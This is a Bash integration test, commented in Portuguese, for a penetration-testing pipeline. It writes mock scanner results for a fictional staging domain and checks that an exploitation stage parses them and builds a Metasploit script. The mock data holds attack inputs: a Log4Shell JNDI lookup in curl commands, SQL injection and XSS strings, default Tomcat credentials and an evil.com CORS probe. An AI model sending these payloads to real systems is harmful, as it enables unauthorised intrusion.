#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
#  SWARM ↔ SWARM RED — Teste de Integração End-to-End
# ═══════════════════════════════════════════════════════════════════════════════
#  Simula output real do SWARM (todas as 11 fases) e valida que o SWARM RED
#  consegue ingerir, parsear e processar cada artefato corretamente.
#
#  Uso: bash test_integration.sh
# ═══════════════════════════════════════════════════════════════════════════════
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SWARM_RED="$SCRIPT_DIR/swarm_red.sh"
PASS=0; FAIL=0; SKIP=0; TOTAL=0
TMPDIR=$(mktemp -d /tmp/swarm_integration_XXXXXX)

GRN='\033[0;32m'; RED='\033[0;31m'; YLW='\033[1;33m'; CYN='\033[0;36m'; RST='\033[0m'

cleanup() { rm -rf "$TMPDIR" swarm_red_alvo.staging.corp_* 2>/dev/null; }
trap cleanup EXIT

assert() {
    local desc="$1" result="$2"
    ((TOTAL++))
    if [ "$result" = "0" ]; then
        echo -e "  ${GRN}[PASS]${RST} $desc"
        ((PASS++))
    else
        echo -e "  ${RED}[FAIL]${RST} $desc"
        ((FAIL++))
    fi
}

assert_file_exists() {
    local desc="$1" file="$2"
    ((TOTAL++))
    if [ -f "$file" ]; then
        echo -e "  ${GRN}[PASS]${RST} $desc"
        ((PASS++))
    else
        echo -e "  ${RED}[FAIL]${RST} $desc — arquivo não encontrado: $file"
        ((FAIL++))
    fi
}

assert_file_contains() {
    local desc="$1" file="$2" pattern="$3"
    ((TOTAL++))
    if [ -f "$file" ] && grep -qE "$pattern" "$file" 2>/dev/null; then
        echo -e "  ${GRN}[PASS]${RST} $desc"
        ((PASS++))
    else
        echo -e "  ${RED}[FAIL]${RST} $desc — pattern '$pattern' not in $(basename "$file")"
        ((FAIL++))
    fi
}

assert_file_not_empty() {
    local desc="$1" file="$2"
    ((TOTAL++))
    if [ -f "$file" ] && [ -s "$file" ]; then
        echo -e "  ${GRN}[PASS]${RST} $desc"
        ((PASS++))
    else
        echo -e "  ${RED}[FAIL]${RST} $desc — arquivo vazio ou inexistente: $(basename "$file")"
        ((FAIL++))
    fi
}

skip() {
    local desc="$1"
    ((SKIP++))
    echo -e "  ${YLW}[SKIP]${RST} $desc"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  GERADOR DE MOCK — SIMULA OUTPUT REAL DO SWARM (11 fases)
# ═══════════════════════════════════════════════════════════════════════════════
generate_swarm_mock() {
    local domain="$1"
    local scan_dir="$TMPDIR/scan_${domain}_20260427_143022"
    local raw="$scan_dir/raw"
    mkdir -p "$raw/screenshots"

    # ── FASE 1: Subfinder → subdomains.txt ──
    cat > "$raw/subdomains.txt" << EOF
$domain
api.$domain
admin.$domain
staging.$domain
cdn.$domain
EOF

    # ── FASE 2: httpx → httpx.jsonl + httpx_results.txt ──
    cat > "$raw/httpx.jsonl" << EOF
{"url":"https://$domain","status_code":200,"title":"Alvo Staging","webserver":"Apache/2.4.52","tech":["Apache","PHP","jQuery"]}
{"url":"https://api.$domain","status_code":200,"title":"API v2","webserver":"nginx/1.22.1","tech":["nginx","Node.js"]}
{"url":"https://admin.$domain","status_code":401,"title":"Admin Panel","webserver":"nginx/1.22.1"}
{"url":"https://staging.$domain","status_code":200,"title":"Staging App","webserver":"Apache/2.4.52"}
EOF
    cat > "$raw/httpx_results.txt" << EOF
https://$domain [200] [Alvo Staging] [Apache/2.4.52]
https://api.$domain [200] [API v2] [nginx/1.22.1]
https://admin.$domain [401] [Admin Panel] [nginx/1.22.1]
https://staging.$domain [200] [Staging App] [Apache/2.4.52]
EOF

    # ── FASE 2: nmap → nmap.txt + nmap.xml ──
    cat > "$raw/nmap.txt" << EOF
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-27 14:30 -0300
Nmap scan report for $domain (10.10.5.100)
Host is up (0.012s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1
80/tcp    open  http       Apache httpd 2.4.52
443/tcp   open  ssl/http   Apache httpd 2.4.52
3306/tcp  open  mysql      MySQL 8.0.28
5432/tcp  open  postgresql PostgreSQL 14.2
8080/tcp  open  http-proxy Apache Tomcat 9.0.65
8443/tcp  open  ssl/http   nginx 1.22.1
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
445/tcp   open  microsoft-ds Windows Server 2019 Standard

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds
EOF

    # Nmap XML (mínimo para importação no Metasploit)
    cat > "$raw/nmap.xml" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap" args="nmap -sV -sC -p 22,80,443,3306,5432,8080,8443,3389,445 $domain" start="1714243822">
<host starttime="1714243822" endtime="1714243864">
<address addr="10.10.5.100" addrtype="ipv4"/>
<hostnames><hostname name="$domain" type="user"/></hostnames>
<ports>
<port protocol="tcp" portid="22"><state state="open"/><service name="ssh" product="OpenSSH" version="8.9p1"/></port>
<port protocol="tcp" portid="80"><state state="open"/><service name="http" product="Apache httpd" version="2.4.52"/></port>
<port protocol="tcp" portid="443"><state state="open"/><service name="ssl/http" product="Apache httpd" version="2.4.52"/></port>
<port protocol="tcp" portid="3306"><state state="open"/><service name="mysql" product="MySQL" version="8.0.28"/></port>
<port protocol="tcp" portid="5432"><state state="open"/><service name="postgresql" product="PostgreSQL" version="14.2"/></port>
<port protocol="tcp" portid="8080"><state state="open"/><service name="http-proxy" product="Apache Tomcat" version="9.0.65"/></port>
<port protocol="tcp" portid="3389"><state state="open"/><service name="ms-wbt-server"/></port>
<port protocol="tcp" portid="445"><state state="open"/><service name="microsoft-ds"/></port>
</ports>
</host>
</nmaprun>
EOF

    # ── FASE 3: testssl → testssl.json ──
    cat > "$raw/testssl.json" << 'EOF'
[
  {"id":"beast","ip":"10.10.5.100/443","port":"443","severity":"LOW","finding":"BEAST (CVE-2011-3389) -- susceptible"},
  {"id":"ccs","ip":"10.10.5.100/443","port":"443","severity":"HIGH","finding":"CCS (CVE-2014-0224) -- VULNERABLE"},
  {"id":"heartbleed","ip":"10.10.5.100/443","port":"443","severity":"CRITICAL","finding":"Heartbleed (CVE-2014-0160) -- VULNERABLE"},
  {"id":"ticketbleed","ip":"10.10.5.100/443","port":"443","severity":"OK","finding":"not vulnerable"},
  {"id":"secure_renego","ip":"10.10.5.100/443","port":"443","severity":"OK","finding":"not vulnerable"},
  {"id":"poodle_ssl","ip":"10.10.5.100/443","port":"443","severity":"HIGH","finding":"POODLE, SSL (CVE-2014-3566) -- VULNERABLE"}
]
EOF

    # ── FASE 4: Nuclei → nuclei.json (JSONL, um por linha) ──
    cat > "$raw/nuclei.json" << EOF
{"template-id":"CVE-2021-44228","info":{"name":"Apache Log4j RCE (Log4Shell)","severity":"critical","classification":{"cve":["CVE-2021-44228"],"cvss-score":10.0},"tags":["cve","rce","log4j"]},"matcher-name":"","type":"http","host":"https://$domain","matched-at":"https://$domain/api/v2/search?q=test","curl-command":"curl -X GET 'https://$domain/api/v2/search?q=\${jndi:ldap://callback/a}'","request":"GET /api/v2/search?q=\${jndi:ldap://callback/a} HTTP/1.1","response":"HTTP/1.1 200 OK\r\nContent-Type: text/html"}
{"template-id":"CVE-2023-22515","info":{"name":"Atlassian Confluence Broken Access Control","severity":"critical","classification":{"cve":["CVE-2023-22515"],"cvss-score":9.8},"tags":["cve","confluence"]},"type":"http","host":"https://admin.$domain","matched-at":"https://admin.$domain/setup/setupadministrator.action","curl-command":"curl 'https://admin.$domain/setup/setupadministrator.action'","request":"GET /setup/setupadministrator.action HTTP/1.1","response":"HTTP/1.1 200 OK"}
{"template-id":"CVE-2023-1234","info":{"name":"SQL Injection in Search","severity":"high","classification":{"cve":["CVE-2023-1234"],"cvss-score":8.6},"tags":["cve","sqli"]},"type":"http","host":"https://$domain","matched-at":"https://$domain/search?q=1'+OR+1=1--","curl-command":"curl 'https://$domain/search?q=1%27+OR+1%3D1--'","request":"GET /search?q=1'+OR+1=1-- HTTP/1.1","response":"HTTP/1.1 500 Internal Server Error\r\nerror in your SQL syntax"}
{"template-id":"CVE-2024-5678","info":{"name":"Tomcat Manager Default Credentials","severity":"high","classification":{"cve":["CVE-2024-5678"],"cvss-score":7.5},"tags":["cve","default-login"]},"type":"http","host":"https://$domain:8080","matched-at":"https://$domain:8080/manager/html","curl-command":"curl -u tomcat:tomcat 'https://$domain:8080/manager/html'","request":"GET /manager/html HTTP/1.1\r\nAuthorization: Basic dG9tY2F0OnRvbWNhdA==","response":"HTTP/1.1 200 OK\r\nTomcat Web Application Manager"}
{"template-id":"http-missing-security-headers","info":{"name":"Missing Content-Security-Policy","severity":"medium","classification":{}},"type":"http","host":"https://$domain","matched-at":"https://$domain","request":"GET / HTTP/1.1","response":"HTTP/1.1 200 OK"}
{"template-id":"x-powered-by-header","info":{"name":"X-Powered-By Header Disclosed","severity":"info","classification":{}},"type":"http","host":"https://$domain","matched-at":"https://$domain","request":"GET / HTTP/1.1","response":"HTTP/1.1 200 OK\r\nX-Powered-By: PHP/8.1.2"}
{"template-id":"cors-misconfiguration","info":{"name":"CORS Misconfiguration","severity":"medium","classification":{}},"type":"http","host":"https://api.$domain","matched-at":"https://api.$domain/api/data?callback=evil","request":"GET /api/data HTTP/1.1\r\nOrigin: https://evil.com","response":"HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: https://evil.com"}
EOF

    # ── FASE 4: nuclei_error.log ──
    echo "[WRN] Could not connect to https://cdn.$domain: context deadline exceeded" > "$raw/nuclei_error.log"

    # ── FASE 5: Exploit confirmations → exploit_confirmations.json ──
    cat > "$raw/exploit_confirmations.json" << EOF
[
  {"finding":"CVE-2021-44228","url":"https://$domain/api/v2/search?q=test","status":"CONFIRMED","http_code":200,"evidence":"jndi callback received"},
  {"finding":"CVE-2023-1234","url":"https://$domain/search?q=1'+OR+1=1--","status":"CONFIRMED","http_code":500,"evidence":"error in your SQL syntax"},
  {"finding":"CVE-2024-5678","url":"https://$domain:8080/manager/html","status":"CONFIRMED","http_code":200,"evidence":"Tomcat Web Application Manager"}
]
EOF

    # ── FASE 6: wafw00f (WAF detection) ──
    cat > "$raw/wafw00f.txt" << EOF
Checking https://$domain
The site https://$domain is behind Cloudflare (Cloudflare Inc.)
Number of requests: 6
EOF

    # ── FASE 7: smuggler ──
    cat > "$raw/smuggler_results.txt" << EOF
[*] Testing https://$domain
[-] Not vulnerable to CL.TE
[-] Not vulnerable to TE.CL
[*] Testing https://api.$domain
[-] Not vulnerable
EOF

    # ── FASE 8: ffuf (endpoint discovery) ──
    cat > "$raw/ffuf_results.json" << EOF
{"results":[
  {"url":"https://$domain/admin","status":403,"length":1234},
  {"url":"https://$domain/.env","status":200,"length":456},
  {"url":"https://$domain/backup.sql","status":200,"length":78901},
  {"url":"https://$domain/api/v2/internal","status":200,"length":2345}
]}
EOF

    # ── FASE 9: OWASP ZAP → zap_alerts.json + zap_evidencias.xml + zap_daemon.log ──
    cat > "$raw/zap_alerts.json" << EOF
[
  {"alert":"SQL Injection","risk":"High","confidence":"Medium","url":"https://$domain/login?user=admin","param":"user","attack":"admin' OR '1'='1","evidence":"error in your SQL syntax","cweid":"89","wascid":"19","description":"SQL Injection found in user parameter"},
  {"alert":"SQL Injection","risk":"High","confidence":"High","url":"https://$domain/search?q=test","param":"q","attack":"test' UNION SELECT NULL--","evidence":"UNION query","cweid":"89"},
  {"alert":"Cross-Site Scripting (Reflected)","risk":"High","confidence":"Medium","url":"https://$domain/search?q=<script>alert(1)</script>","param":"q","attack":"<script>alert(1)</script>","evidence":"<script>alert(1)</script>","cweid":"79"},
  {"alert":"Missing Content-Security-Policy","risk":"Medium","confidence":"High","url":"https://$domain","cweid":"693"},
  {"alert":"X-Content-Type-Options Header Missing","risk":"Low","confidence":"Medium","url":"https://$domain"},
  {"alert":"Server Leaks Version Information","risk":"Low","confidence":"High","url":"https://$domain","evidence":"Apache/2.4.52"},
  {"alert":"Cookie Without SameSite Attribute","risk":"Low","confidence":"Medium","url":"https://$domain"},
  {"alert":"Information Disclosure - Suspicious Comments","risk":"Informational","confidence":"Medium","url":"https://$domain/js/app.js","evidence":"TODO: remove before production"},
  {"alert":"Timestamp Disclosure","risk":"Informational","confidence":"Low","url":"https://$domain/api/status"}
]
EOF

    echo '<?xml version="1.0"?><OWASPZAPReport><site host="'$domain'" port="443" ssl="true"></site></OWASPZAPReport>' > "$raw/zap_evidencias.xml"
    echo "ZAP 2.15.0 started successfully on port 8080" > "$raw/zap_daemon.log"

    # ── FASE 10: JS/Secrets Analysis ──
    cat > "$raw/js_secrets.json" << EOF
[
  {"type":"api_key","file":"https://$domain/js/app.js","match":"AIzaSyB-FAKE-KEY-1234567890","line":42},
  {"type":"aws_key","file":"https://$domain/js/config.js","match":"AKIAIOSFODNN7EXAMPLE","line":15},
  {"type":"endpoint","file":"https://$domain/js/app.js","match":"/api/v2/internal/users","line":128}
]
EOF

    # ── FASE 11: Relatório HTML ──
    echo "<html><body><h1>SWARM Report - $domain</h1></body></html>" > "$scan_dir/relatorio_swarm.html"

    # ── Screenshots ──
    # Simulamos com arquivos vazios (PNG de 1 pixel)
    printf '\x89PNG\r\n\x1a\n' > "$raw/screenshots/main.png"
    printf '\x89PNG\r\n\x1a\n' > "$raw/screenshots/finding_1.png"

    # ── OpenAPI spec (se descoberto pelo ZAP) ──
    cat > "$raw/openapi_spec.json" << EOF
{"openapi":"3.0.0","info":{"title":"API $domain","version":"2.0"},"paths":{"/api/v2/search":{"get":{"parameters":[{"name":"q","in":"query"}]}}}}
EOF

    echo "$scan_dir"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  TESTES
# ═══════════════════════════════════════════════════════════════════════════════

echo ""
echo -e "${CYN}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${CYN}  SWARM ↔ SWARM RED — Teste de Integração End-to-End${RST}"
echo -e "${CYN}═══════════════════════════════════════════════════════════════════════${RST}"
echo ""

DOMAIN="alvo.staging.corp"
MOCK_DIR=$(generate_swarm_mock "$DOMAIN")
RAW="$MOCK_DIR/raw"

# ─── BLOCO 1: Validar que o mock simula output real do SWARM ───
echo -e "${YLW}▸ Mock SWARM output — completude${RST}"

assert_file_exists   "FASE 1: subdomains.txt"               "$RAW/subdomains.txt"
assert_file_exists   "FASE 2: httpx.jsonl"                   "$RAW/httpx.jsonl"
assert_file_exists   "FASE 2: httpx_results.txt"             "$RAW/httpx_results.txt"
assert_file_exists   "FASE 2: nmap.txt"                      "$RAW/nmap.txt"
assert_file_exists   "FASE 2: nmap.xml"                      "$RAW/nmap.xml"
assert_file_exists   "FASE 3: testssl.json"                  "$RAW/testssl.json"
assert_file_exists   "FASE 4: nuclei.json"                   "$RAW/nuclei.json"
assert_file_exists   "FASE 4: nuclei_error.log"              "$RAW/nuclei_error.log"
assert_file_exists   "FASE 5: exploit_confirmations.json"    "$RAW/exploit_confirmations.json"
assert_file_exists   "FASE 6: wafw00f.txt"                   "$RAW/wafw00f.txt"
assert_file_exists   "FASE 7: smuggler_results.txt"          "$RAW/smuggler_results.txt"
assert_file_exists   "FASE 8: ffuf_results.json"             "$RAW/ffuf_results.json"
assert_file_exists   "FASE 9: zap_alerts.json"               "$RAW/zap_alerts.json"
assert_file_exists   "FASE 9: zap_evidencias.xml"            "$RAW/zap_evidencias.xml"
assert_file_exists   "FASE 9: zap_daemon.log"                "$RAW/zap_daemon.log"
assert_file_exists   "FASE 10: js_secrets.json"              "$RAW/js_secrets.json"
assert_file_exists   "FASE 11: relatorio_swarm.html"         "$MOCK_DIR/relatorio_swarm.html"
assert_file_exists   "Screenshots: main.png"                 "$RAW/screenshots/main.png"
assert_file_exists   "OpenAPI spec"                          "$RAW/openapi_spec.json"

# Contar artefatos totais
file_count=$(find "$RAW" -type f | wc -l)
assert "Mock tem 17+ artefatos (encontrados: $file_count)" "$([ "$file_count" -ge 17 ] && echo 0 || echo 1)"

# ─── BLOCO 2: Executar SWARM RED em dry-run e validar ingestão ───
echo ""
echo -e "${YLW}▸ SWARM RED — Ingestão de dados${RST}"

cd "$SCRIPT_DIR"
rm -rf swarm_red_${DOMAIN}_* 2>/dev/null

# Executar dry-run
OUTPUT=$(echo "EU AUTORIZO" | bash "$SWARM_RED" -d "$MOCK_DIR" --dry-run 2>&1)
EXIT_CODE=$?

assert "SWARM RED executou sem crash (exit=$EXIT_CODE)" "$EXIT_CODE"

# Encontrar output dir
REDDIR=$(ls -dt swarm_red_${DOMAIN}_* 2>/dev/null | head -1)
assert "Output dir criado: ${REDDIR:-NOT_FOUND}" "$([ -n "$REDDIR" ] && [ -d "$REDDIR" ] && echo 0 || echo 1)"

if [ -z "$REDDIR" ] || [ ! -d "$REDDIR" ]; then
    echo -e "  ${RED}FATAL: sem output dir — abortando testes restantes${RST}"
    echo ""
    echo -e "${YLW}═══════════════════════════════════════════════════════════════${RST}"
    echo -e "  ${GRN}PASS: $PASS${RST}  |  ${RED}FAIL: $FAIL${RST}  |  Total: $TOTAL"
    echo -e "${YLW}═══════════════════════════════════════════════════════════════${RST}"
    exit 1
fi

# ─── BLOCO 3: Validar parsing de cada fonte do SWARM ───
echo ""
echo -e "${YLW}▸ Parsing de artefatos SWARM${RST}"

# Nuclei ingestão
assert_file_exists     "Nuclei JSONL copiado"        "$REDDIR/input_nuclei.jsonl"
assert_file_not_empty  "Nuclei JSONL não vazio"       "$REDDIR/input_nuclei.jsonl"

# CVEs extraídos
assert_file_exists     "cves_found.txt criado"        "$REDDIR/cves_found.txt"
assert_file_contains   "CVE-2021-44228 extraído"      "$REDDIR/cves_found.txt" "CVE-2021-44228"
assert_file_contains   "CVE-2023-22515 extraído"      "$REDDIR/cves_found.txt" "CVE-2023-22515"
assert_file_contains   "CVE-2023-1234 extraído"       "$REDDIR/cves_found.txt" "CVE-2023-1234"
assert_file_contains   "CVE-2024-5678 extraído"       "$REDDIR/cves_found.txt" "CVE-2024-5678"

cve_count=$(wc -l < "$REDDIR/cves_found.txt" 2>/dev/null || echo 0)
assert "4 CVEs extraídos (encontrados: $cve_count)" "$([ "$cve_count" -eq 4 ] && echo 0 || echo 1)"

# URLs com parâmetros (candidatas SQLi)
assert_file_exists     "urls_with_params.txt criado"  "$REDDIR/urls_with_params.txt"
assert_file_not_empty  "URLs com params extraídas"     "$REDDIR/urls_with_params.txt"
assert_file_contains   "URL com ?q= extraída"          "$REDDIR/urls_with_params.txt" "search\?q="

# Todas as URLs
assert_file_exists     "all_target_urls.txt criado"   "$REDDIR/all_target_urls.txt"
url_count=$(wc -l < "$REDDIR/all_target_urls.txt" 2>/dev/null || echo 0)
assert "Múltiplas URLs extraídas (encontradas: $url_count)" "$([ "$url_count" -ge 4 ] && echo 0 || echo 1)"

# Nmap
assert_file_exists     "Nmap copiado"                 "$REDDIR/input_nmap.txt"
assert_file_exists     "open_services.txt criado"     "$REDDIR/open_services.txt"
assert_file_contains   "Porta 22/ssh detectada"        "$REDDIR/open_services.txt" "22/tcp"
assert_file_contains   "Porta 80/http detectada"       "$REDDIR/open_services.txt" "80/tcp"
assert_file_contains   "Porta 443/ssl detectada"       "$REDDIR/open_services.txt" "443/tcp"
assert_file_contains   "Porta 3306/mysql detectada"    "$REDDIR/open_services.txt" "3306/tcp"
assert_file_contains   "Porta 5432/postgres detectada" "$REDDIR/open_services.txt" "5432/tcp"
assert_file_contains   "Porta 8080/tomcat detectada"   "$REDDIR/open_services.txt" "8080/tcp"
assert_file_contains   "Porta 3389/rdp detectada"      "$REDDIR/open_services.txt" "3389/tcp"
assert_file_contains   "Porta 445/smb detectada"       "$REDDIR/open_services.txt" "445/tcp"

svc_count=$(wc -l < "$REDDIR/open_services.txt" 2>/dev/null || echo 0)
assert "9 serviços detectados (encontrados: $svc_count)" "$([ "$svc_count" -eq 9 ] && echo 0 || echo 1)"

# ZAP
assert_file_exists     "ZAP JSON copiado"             "$REDDIR/input_zap.json"
assert_file_exists     "zap_sqli_urls.txt criado"     "$REDDIR/zap_sqli_urls.txt"
assert_file_not_empty  "ZAP SQLi URLs extraídas"       "$REDDIR/zap_sqli_urls.txt"
assert_file_contains   "ZAP SQLi: /login"              "$REDDIR/zap_sqli_urls.txt" "login"
assert_file_contains   "ZAP SQLi: /search"             "$REDDIR/zap_sqli_urls.txt" "search"

assert_file_exists     "zap_high_crit.txt criado"     "$REDDIR/zap_high_crit.txt"
assert_file_contains   "ZAP High alert: SQLi"          "$REDDIR/zap_high_crit.txt" "SQL Injection"
assert_file_contains   "ZAP High alert: XSS"           "$REDDIR/zap_high_crit.txt" "Cross-Site Scripting"

# testssl
assert_file_exists     "testssl copiado"              "$REDDIR/input_testssl.json"

# httpx
assert_file_exists     "httpx copiado"                "$REDDIR/input_httpx.jsonl"

# ─── BLOCO 4: Validar SQLi target consolidation ───
echo ""
echo -e "${YLW}▸ Consolidação de alvos SQLi${RST}"

assert_file_exists     "sqli_targets.txt criado"      "$REDDIR/sqli_targets.txt"
if [ -f "$REDDIR/sqli_targets.txt" ]; then
    sqli_count=$(wc -l < "$REDDIR/sqli_targets.txt" 2>/dev/null || echo 0)
    assert "SQLi targets consolidados (Nuclei+ZAP): $sqli_count URLs" "$([ "$sqli_count" -ge 2 ] && echo 0 || echo 1)"

    # Verifica deduplicação — URLs do Nuclei e ZAP devem estar merged
    assert_file_contains "Tem URL do Nuclei (search?q=)" "$REDDIR/sqli_targets.txt" "search"
    assert_file_contains "Tem URL do ZAP (login)"        "$REDDIR/sqli_targets.txt" "login"
fi

# ─── BLOCO 5: Validar Metasploit RC gerado ───
echo ""
echo -e "${YLW}▸ Metasploit Resource Script${RST}"

if command -v msfconsole &>/dev/null; then
    assert_file_exists     "swarm_red.rc gerado"         "$REDDIR/metasploit/swarm_red.rc"

    if [ -f "$REDDIR/metasploit/swarm_red.rc" ]; then
        RC="$REDDIR/metasploit/swarm_red.rc"
        assert_file_contains "RC: RHOSTS definido"             "$RC" "RHOSTS"
        assert_file_contains "RC: LHOST definido"              "$RC" "LHOST"
        assert_file_contains "RC: workspace criado"            "$RC" "workspace"
        assert_file_contains "RC: nmap XML importado"          "$RC" "db_import.*nmap"
        assert_file_contains "RC: http_version scanner"        "$RC" "http_version"
        assert_file_contains "RC: ssl_version scanner"         "$RC" "ssl_version"
        assert_file_contains "RC: dir_scanner"                 "$RC" "dir_scanner"
        assert_file_contains "RC: tomcat_mgr_login"            "$RC" "tomcat_mgr_login"

        # Service-specific modules baseados no nmap
        assert_file_contains "RC: SSH enum (porta 22)"         "$RC" "ssh_enumusers"
        assert_file_contains "RC: SMB version (porta 445)"     "$RC" "smb_version"
        assert_file_contains "RC: SMB shares (porta 445)"      "$RC" "smb_enumshares"
        assert_file_contains "RC: MySQL login (porta 3306)"    "$RC" "mysql_login"
        assert_file_contains "RC: Postgres login (porta 5432)" "$RC" "postgres_login"
        assert_file_contains "RC: RDP scanner (porta 3389)"    "$RC" "rdp_scanner"

        # CVE searches
        assert_file_contains "RC: busca CVE-2021-44228"        "$RC" "CVE-2021-44228"
        assert_file_contains "RC: busca CVE-2023-22515"        "$RC" "CVE-2023-22515"
        assert_file_contains "RC: busca CVE-2023-1234"         "$RC" "CVE-2023-1234"
        assert_file_contains "RC: busca CVE-2024-5678"         "$RC" "CVE-2024-5678"

        # Export
        assert_file_contains "RC: export hosts.csv"            "$RC" "hosts.csv"
        assert_file_contains "RC: export services.csv"         "$RC" "services.csv"
        assert_file_contains "RC: export vulns.csv"            "$RC" "vulns.csv"
        assert_file_contains "RC: export creds.csv"            "$RC" "creds.csv"
    fi
else
    skip "Metasploit RC tests (msfconsole não instalado)"
fi

# ─── BLOCO 6: Validar output nas fases de exploração (dry-run) ───
echo ""
echo -e "${YLW}▸ Dry-run — fases de exploração${RST}"

echo "$OUTPUT" | grep -q "DRY-RUN"
assert "Dry-run markers presentes" "$?"

echo "$OUTPUT" | grep -qi "sqlmap"
assert "sqlmap fase referenciada" "$?"

echo "$OUTPUT" | grep -qi "FASE 2/6.*SQL"
assert "Fase 2 (SQLi) executada" "$?"

echo "$OUTPUT" | grep -qi "FASE 3/6.*METASPLOIT"
assert "Fase 3 (MSF) executada" "$?"

echo "$OUTPUT" | grep -qi "FASE 4/6.*BRUTE"
assert "Fase 4 (Brute) referenciada" "$?"

echo "$OUTPUT" | grep -qi "FASE 5/6.*NIKTO"
assert "Fase 5 (Nikto) referenciada" "$?"

echo "$OUTPUT" | grep -qi "FASE 6/6.*SEARCHSPLOIT\|RELATÓRIO"
assert "Fase 6 (Report) executada" "$?"

# ─── BLOCO 7: Validar relatório HTML ───
echo ""
echo -e "${YLW}▸ Relatório HTML${RST}"

REPORT="$REDDIR/relatorio_swarm_red.html"
assert_file_exists     "Relatório gerado"             "$REPORT"
assert_file_not_empty  "Relatório não vazio"           "$REPORT"

if [ -f "$REPORT" ]; then
    assert_file_contains "HTML: contém target"           "$REPORT" "$DOMAIN"
    assert_file_contains "HTML: contém SWARM RED"        "$REPORT" "SWARM RED"
    assert_file_contains "HTML: contém CONFIDENCIAL"     "$REPORT" "CONFIDENCIAL"
    assert_file_contains "HTML: contém CVEs"             "$REPORT" "CVE"
    assert_file_contains "HTML: styled (tem CSS)"        "$REPORT" "<style>"
    assert_file_contains "HTML: tem stats section"       "$REPORT" "Testes"

    # Tamanho mínimo (relatório real > 5KB)
    size=$(stat -f%z "$REPORT" 2>/dev/null || stat -c%s "$REPORT" 2>/dev/null || echo 0)
    assert "Relatório > 5KB (tamanho: ${size}B)" "$([ "$size" -gt 5000 ] && echo 0 || echo 1)"
fi

# ─── BLOCO 8: Validar activity log ───
echo ""
echo -e "${YLW}▸ Activity Log${RST}"

assert_file_exists     "swarm_red.log existe"         "$REDDIR/swarm_red.log"
assert_file_not_empty  "Log não vazio"                 "$REDDIR/swarm_red.log"
assert_file_contains   "Log: versão registrada"        "$REDDIR/swarm_red.log" "SWARM RED"
assert_file_contains   "Log: profile registrado"       "$REDDIR/swarm_red.log" "staging"

# ─── BLOCO 9: Perfis (production restrictions com mock completo) ───
echo ""
echo -e "${YLW}▸ Perfil production com mock real${RST}"

rm -rf swarm_red_${DOMAIN}_* 2>/dev/null
PROD_OUTPUT=$(echo "EU AUTORIZO" | bash "$SWARM_RED" -d "$MOCK_DIR" -p production --dry-run 2>&1)

echo "$PROD_OUTPUT" | grep -qiE "brute force desabilitado"
assert "Production: brute force bloqueado" "$?"

echo "$PROD_OUTPUT" | grep -qiE "nikto desabilitado"
assert "Production: nikto bloqueado" "$?"

rm -rf swarm_red_${DOMAIN}_* 2>/dev/null

# ─── BLOCO 10: Target auto-detection ───
echo ""
echo -e "${YLW}▸ Target auto-detection do nome do diretório${RST}"

echo "$OUTPUT" | grep -q "$DOMAIN"
assert "Target extraído do dir name: $DOMAIN" "$?"

# Testar com nome de diretório diferente
ALT_MOCK="$TMPDIR/scan_outro.site.com_20260101_000000"
mkdir -p "$ALT_MOCK/raw"
echo '{"template-id":"test","info":{"name":"Test","severity":"info"},"host":"https://outro.site.com","matched-at":"https://outro.site.com"}' > "$ALT_MOCK/raw/nuclei.json"
cat > "$ALT_MOCK/raw/nmap.txt" << 'EOF'
80/tcp  open  http  nginx
EOF

ALT_OUTPUT=$(echo "EU AUTORIZO" | bash "$SWARM_RED" -d "$ALT_MOCK" --dry-run 2>&1)
echo "$ALT_OUTPUT" | grep -q "outro.site.com"
assert "Target auto-detectado: outro.site.com" "$?"

rm -rf swarm_red_outro.site.com_* 2>/dev/null

# ─── BLOCO 11: Consistência de contadores ───
echo ""
echo -e "${YLW}▸ Contadores e sumário${RST}"

echo "$OUTPUT" | grep -qiE "SUMÁRIO FINAL"
assert "Sumário final exibido" "$?"

echo "$OUTPUT" | grep -qiE "Testes:.*[0-9]"
assert "Contador de testes no sumário" "$?"

echo "$OUTPUT" | grep -qiE "Exploits:.*[0-9]"
assert "Contador de exploits no sumário" "$?"

echo "$OUTPUT" | grep -qiE "Relatório:.*relatorio_swarm_red.html"
assert "Path do relatório no sumário" "$?"

# ═══════════════════════════════════════════════════════════════════════════════
#  SUMÁRIO FINAL
# ═══════════════════════════════════════════════════════════════════════════════
echo ""
echo -e "${CYN}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "  ${GRN}PASS: $PASS${RST}  |  ${RED}FAIL: $FAIL${RST}  |  ${YLW}SKIP: $SKIP${RST}  |  Total: $TOTAL"
echo -e "${CYN}═══════════════════════════════════════════════════════════════════════${RST}"

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
